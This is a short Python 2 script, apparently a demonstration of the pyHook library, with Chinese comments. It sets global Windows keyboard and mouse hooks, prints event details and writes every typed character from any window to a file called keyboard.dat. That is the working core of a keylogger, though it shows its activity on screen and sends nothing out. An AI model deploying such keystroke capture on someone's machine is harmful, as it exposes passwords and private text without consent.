# -*- coding: utf-8 -*-


import pythoncom
import pyHook


class Hook(object):
    
    def __init__(self):
        """ init """
        
        self.fh = open("keyboard.dat", "wb")
        
        pass
 
    def onMouseEvent(self, event):
        # 监听鼠标事件
        #print dir(event)
        print "MessageName:", event.MessageName
        print "Message:", event.Message
        #print "Time:", event.Time
        #print "Window:", event.Window
        #print "WindowName:", event.WindowName
        print "Position:", event.Position
        #print "Wheel:", event.Wheel
        #print "Injected:", event.Injected
        #self.fh.write("1")
        print "---"
     
        return True
     
    def onKeyboardEvent(self, event):
        # 监听键盘事件
        #print dir(event)
        print "MessageName:", event.MessageName
        print "Message:", event.Message
        print "Time:", event.Time
        print "Window:", event.Window
        print "WindowName:", event.WindowName
        print "Ascii:", event.Ascii, chr(event.Ascii)
        print "Key:", event.Key
        print "KeyID:", event.KeyID
        print "ScanCode:", event.ScanCode
        print "Extended:", event.Extended
        print "Injected:", event.Injected
        print "Alt", event.Alt
        print "Transition", event.Transition
        print "---"
        
        try:
            print "write"
            self.fh.write(chr(event.Ascii))
            #self.fh.write(event.Key)
            self.fh.flush()
        except:
            print "exc"
            #123
     
        # 同鼠标事件监听函数的返回值
        return True
        
    def __del__(self):
        #self.fh.close()
        pass
 
def main():
    # 创建一个“钩子”管理对象
    
    hk = Hook()
    
    hm = pyHook.HookManager()
 
    # 监听所有键盘事件
    hm.KeyDown = hk.onKeyboardEvent
    # 设置键盘“钩子”
    hm.HookKeyboard()
 
    # 监听所有鼠标事件
    hm.MouseAll = hk.onMouseEvent
    # 设置鼠标“钩子”
    hm.HookMouse()
 
    # 进入循环，如不手动关闭，程序将一直处于监听状态
    pythoncom.PumpMessages(10000)
 
if __name__ == "__main__":
    main()